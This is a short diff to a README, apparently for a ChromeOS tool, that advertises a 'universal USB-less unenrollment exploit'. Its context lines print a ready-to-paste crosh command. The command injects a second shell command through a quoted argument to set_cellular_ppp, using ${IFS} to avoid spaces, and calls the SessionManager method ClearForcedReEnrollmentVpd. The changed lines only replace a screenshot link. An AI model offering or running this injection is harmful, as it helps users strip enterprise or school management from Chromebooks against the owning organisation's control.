@@ -58,4 +58,4 @@ Pretty cool universal USB-less unenrollment exploit that requires you to have a 
 `set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'`
 
 Just like this \
-<img src="https://github.com/kkilobyte/ditch-cros/blob/main/img/tutorial/crosh-rootesc.png?raw=true" alt="crosh-rootesc.png"/><img width="1217" height="216" alt="image" src="https://github.com/user-attachments/assets/ce4c9154-2aad-43a2-85f2-8aa0ae711267" />
+<img width="1217" height="216" alt="crosh-rootesc" src="https://github.com/user-attachments/assets/c163897d-e943-4cb5-b3e3-808bf5f4aee4" />
